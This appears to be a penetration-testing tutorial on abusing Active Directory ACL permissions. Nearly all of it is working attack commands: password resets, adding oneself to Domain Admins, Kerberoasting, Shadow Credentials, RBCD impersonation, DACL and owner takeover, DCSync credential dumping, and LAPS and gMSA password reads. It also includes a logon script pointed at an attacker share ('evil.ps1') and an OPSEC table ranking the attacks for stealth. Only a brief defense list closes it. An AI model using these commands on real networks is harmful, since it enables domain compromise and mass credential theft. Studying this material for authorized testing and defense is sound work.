---
title: "Active Directory ACL Abuse: Every Attack Path Explained"
description: "Comprehensive guide to exploiting Active Directory Access Control List misconfigurations - GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword, and dangerous extended rights."
date: 2026-03-17
difficulty: Hard
tags: [active-directory, acl, bloodhound, dacl, privilege-escalation]
---

## What are AD ACLs

Every Active Directory object (user, computer, group, OU) has a Discretionary Access Control List (DACL) defining who can do what to it. When administrators misconfigure these permissions - often through delegation, scripts, or service account setup - attackers can abuse them for privilege escalation.

BloodHound visualizes these as edges in the attack graph. Understanding each edge type is essential for AD exploitation.

## Enumerating ACLs

### With BloodHound

```bash
# Collect all ACL data
SharpHound.exe --CollectionMethods All --Domain corp.local
# Or from Linux
bloodhound-python -d corp.local -u jsmith -p 'Pass1' -c all -ns 10.0.0.1
```

Key Cypher queries:

```cypher
# Find all users with GenericAll on another user
MATCH (u:User)-[:GenericAll]->(t:User) RETURN u.name, t.name

# Find ACL paths to Domain Admins
MATCH p=shortestPath((n {owned:true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p
```

### With PowerView

```powershell
# Find all ACEs for a specific object
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner"}

# Find objects where our user has dangerous rights
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match "jsmith"}
```

## Attack: GenericAll

**GenericAll** = full control over the object. The most dangerous permission.

### On a User

```powershell
# Option 1: Reset their password
Set-ADAccountPassword -Identity target -Reset -NewPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

# Option 2: Set SPN for Kerberoasting (if user has no SPN)
Set-ADUser target -ServicePrincipalNames @{Add='fake/spn'}
# Then Kerberoast them
Rubeus.exe kerberoast /user:target

# Option 3: Shadow Credentials (stealthier)
Whisker.exe add /target:target /domain:corp.local

# Option 4: Targeted AS-REP Roast
Set-ADAccountControl target -DoesNotRequirePreAuth $true
```

### On a Group

```powershell
# Add yourself to the group
Add-ADGroupMember -Identity "Domain Admins" -Members jsmith
# Or with net
net group "Domain Admins" jsmith /add /domain
```

### On a Computer

```powershell
# RBCD attack: configure delegation to yourself
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount attacker$
# Then S4U to impersonate DA
getST.py corp.local/attacker$:'Pass1' -spn cifs/target -impersonate administrator
```

## Attack: GenericWrite

**GenericWrite** = write any attribute on the object.

### On a User

```powershell
# Set SPN → Kerberoast
Set-ADUser target -ServicePrincipalNames @{Add='http/fake'}

# Shadow Credentials
Whisker.exe add /target:target

# Set logon script (social engineering / wait for logon)
Set-ADUser target -ScriptPath "\attacker\share\evil.ps1"
```

### On a Computer

```powershell
# RBCD attack (most common)
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount attacker$

# Modify msDS-KeyCredentialLink (Shadow Credentials)
Whisker.exe add /target:target$ /domain:corp.local
```

### On a Group

```powershell
# Write to member attribute → add yourself
Add-ADGroupMember -Identity target_group -Members jsmith
```

## Attack: WriteDacl

**WriteDacl** = modify the DACL (add new ACEs). You can grant yourself any permission.

```powershell
# Grant yourself GenericAll on the object
$target = Get-ADUser target
$acl = Get-Acl "AD:\$($target.DistinguishedName)"
$identity = New-Object System.Security.Principal.NTAccount("corp.local\jsmith")
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $identity, "GenericAll", "Allow")
$acl.AddAccessRule($rule)
Set-Acl "AD:\$($target.DistinguishedName)" $acl
# Now you have GenericAll → proceed with GenericAll attacks
```

### With Impacket (from Linux)

```bash
dacledit.py corp.local/jsmith:'Pass1' -target target_user -action write -rights FullControl -principal jsmith -dc-ip 10.0.0.1
```

## Attack: WriteOwner

**WriteOwner** = change the object's owner. As owner, you can modify the DACL.

```powershell
# Take ownership
$target = Get-ADUser target
Set-ADObject $target -Replace @{nTSecurityDescriptor=(Get-ADUser jsmith).SID}
# Now modify the DACL (you're the owner)
# Grant yourself GenericAll, then proceed
```

### With Impacket

```bash
owneredit.py corp.local/jsmith:'Pass1' -target target_user -new-owner jsmith -dc-ip 10.0.0.1
```

## Attack: ForceChangePassword

**ForceChangePassword** = reset the target's password without knowing the current one.

```powershell
Set-ADAccountPassword -Identity target -Reset -NewPassword (ConvertTo-SecureString 'Pwned123!' -AsPlainText -Force)
```

This is the simplest ACL abuse but the most detectable - the user will notice their password changed. Prefer Shadow Credentials or Kerberoasting when stealth matters.

## Extended Rights

### DCSync (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)

If a user has both replication rights on the domain object:

```bash
impacket-secretsdump corp.local/jsmith:'Pass1'@dc01 -just-dc
```

### ReadLAPSPassword

```powershell
Get-ADComputer target -Properties ms-Mcs-AdmPwd | select ms-Mcs-AdmPwd
```

### ReadGMSAPassword

```bash
gMSADumper.py -u jsmith -p 'Pass1' -d corp.local -l dc01
```

## OPSEC Comparison

| Attack | Stealth | Persistence | Cleanup Difficulty |
|--------|---------|-------------|-------------------|
| Shadow Credentials | High | Medium | Easy (remove key) |
| Kerberoasting (via SPN set) | Medium | None | Easy (remove SPN) |
| Password Reset | Low | None | Hard (user notices) |
| Group Membership Add | Low | High | Easy (remove member) |
| RBCD | High | Medium | Medium |
| WriteDacl (grant GenericAll) | Medium | High | Medium |

## Defense

1. **Audit ACLs regularly** - use BloodHound or PingCastle to identify dangerous permissions
2. **Follow least privilege** - service accounts should not have GenericAll on anything
3. **Monitor sensitive attribute changes** - Event ID 5136 for directory modifications
4. **Protect privileged groups** - AdminSDHolder propagates ACL protections to all admin groups
5. **Use tiered admin model** - Tier 0 (domain controllers), Tier 1 (servers), Tier 2 (workstations)

> ACL abuse is the most underrated attack vector in Active Directory. Organizations focus on patching CVEs while ignoring that their helpdesk account has GenericAll on the entire domain. Run BloodHound - you'll be shocked at what you find.
